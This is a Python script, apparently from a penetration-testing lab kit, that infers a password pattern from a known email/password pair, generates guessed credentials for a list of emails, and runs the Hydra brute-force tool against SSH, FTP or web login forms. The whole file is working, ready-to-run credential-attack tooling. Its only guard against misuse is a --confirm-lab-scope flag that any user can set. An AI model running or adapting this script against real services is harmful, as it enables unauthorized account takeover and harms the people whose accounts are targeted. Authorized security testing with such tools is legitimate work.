#!/usr/bin/env python3
"""
Generate baseline credentials and run Hydra in one step (scoped lab only).

Example (HTTP form):
  python3 run_hydra_test.py demo-emails.csv \\
    --base-email known@lab.local --base-password 'Known!' \\
    --target demo.lab.local --service http-post-form \\
    --form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials' \\
    --confirm-lab-scope

Example (SSH):
  python3 run_hydra_test.py demo-emails.csv \\
    --base-email u@lab.local --base-password 'Pass!' \\
    --target 127.0.0.1 --service ssh \\
    --confirm-lab-scope
"""

from __future__ import annotations

import argparse
import csv
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

from generate_passwords import apply_pattern, load_emails
from pattern_infer import infer_pattern_from_samples, pattern_uses_index

SCRIPT_DIR = Path(__file__).resolve().parent


def build_pairs(
    emails_path: Path,
    base_email: str | None,
    base_password: str | None,
    samples_path: Path | None,
    pattern: str | None,
    start_index: int,
) -> list[tuple[str, str]]:
    if pattern:
        pat = pattern
    else:
        samples: list[tuple[str, str]] = []
        if base_email and base_password:
            samples.append((base_email.strip(), base_password))
        elif samples_path:
            from demo_password_bot import load_samples as ls

            samples = ls(samples_path)
        if not samples:
            raise SystemExit("Need --pattern, or --base-email + --base-password, or --samples.")
        pat = infer_pattern_from_samples(samples)

    emails = load_emails(emails_path)
    if not emails:
        raise SystemExit("No emails in input file.")

    use_index = pattern_uses_index(pat)
    rows: list[tuple[str, str]] = []
    for i, email in enumerate(emails, start=start_index):
        idx = i if use_index else 1
        rows.append((email, apply_pattern(pat, email, idx)))
    return rows


def write_hydra_c(path: Path, pairs: list[tuple[str, str]]) -> None:
    lines = [f"{e}:{p}" for e, p in pairs]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def find_hydra(explicit: str | None) -> str:
    if explicit:
        p = Path(explicit)
        if p.is_file():
            return str(p.resolve())
        raise SystemExit(f"Hydra not found at {explicit}")
    found = shutil.which("hydra")
    if found:
        return found
    local = SCRIPT_DIR.parent.parent / "thc-hydra" / "hydra"
    if local.is_file():
        return str(local)
    raise SystemExit("Hydra not in PATH. Install hydra or pass --hydra-bin /path/to/hydra")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Auto: emails + baseline → hydra -C → run Hydra (lab scope only)."
    )
    parser.add_argument("emails", type=Path, help="Demo emails (csv or txt)")
    parser.add_argument("--base-email", help="Known demo account email")
    parser.add_argument("--base-password", help="Known password for --base-email")
    parser.add_argument("--samples", type=Path, help="CSV email,password to infer pattern")
    parser.add_argument("--pattern", help="Explicit pattern instead of inference")
    parser.add_argument("--start-index", type=int, default=1)
    parser.add_argument("--target", required=True, help="Lab host (no https://)")
    parser.add_argument(
        "--service",
        required=True,
        help="Hydra module: ssh, ftp, http-post-form, https-post-form, ...",
    )
    parser.add_argument(
        "--form",
        help="Required for http(s)-post-form: '/path:fields:F=failtext'",
    )
    parser.add_argument("--hydra-bin", help="Path to hydra binary")
    parser.add_argument("-t", "--tasks", type=int, default=4, help="Hydra parallel tasks")
    parser.add_argument("-f", "--exit-first", action="store_true", help="Hydra -f stop on first hit")
    parser.add_argument("-S", "--ssl", action="store_true", help="Hydra -S (SSL)")
    parser.add_argument(
        "--work-dir",
        type=Path,
        help="Keep hydra-C.txt and results here (default: temp dir)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Only write hydra-C.txt and print hydra command",
    )
    parser.add_argument(
        "--confirm-lab-scope",
        action="store_true",
        help="Required to run Hydra (ack scoped lab authorization)",
    )
    args = parser.parse_args()

    if args.service in ("http-post-form", "https-post-form") and not args.form:
        print("HTTP form tests require --form (see lab/hydra-http-form-test.md).", file=sys.stderr)
        return 1

    pairs = build_pairs(
        args.emails,
        args.base_email,
        args.base_password,
        args.samples,
        args.pattern,
        args.start_index,
    )

    work = args.work_dir or Path(tempfile.mkdtemp(prefix="hydra-test-"))
    work.mkdir(parents=True, exist_ok=True)
    c_file = work / "hydra-C.txt"
    results = work / "hydra-results.txt"
    write_hydra_c(c_file, pairs)
    print(f"Wrote {len(pairs)} pairs to {c_file}", file=sys.stderr)

    hydra_bin = args.hydra_bin or "hydra"
    if not args.dry_run:
        hydra_bin = find_hydra(args.hydra_bin)
    cmd = [
        hydra_bin,
        "-C",
        str(c_file),
        "-t",
        str(args.tasks),
        "-o",
        str(results),
        "-b",
        "text",
    ]
    if args.exit_first:
        cmd.append("-f")
    if args.ssl:
        cmd.append("-S")

    if args.form:
        cmd.extend([args.target, args.service, args.form])
    else:
        cmd.extend([args.target, args.service])

    print("Hydra command:", " ".join(cmd), file=sys.stderr)

    if args.dry_run:
        print(str(c_file))
        return 0

    if not args.confirm_lab_scope:
        print(
            "Refusing to run Hydra without --confirm-lab-scope "
            "(manager-approved lab only). Use --dry-run to preview.",
            file=sys.stderr,
        )
        return 1

    proc = subprocess.run(cmd, capture_output=False)
    if results.is_file():
        print(f"Results: {results}", file=sys.stderr)
    return proc.returncode


if __name__ == "__main__":
    raise SystemExit(main())
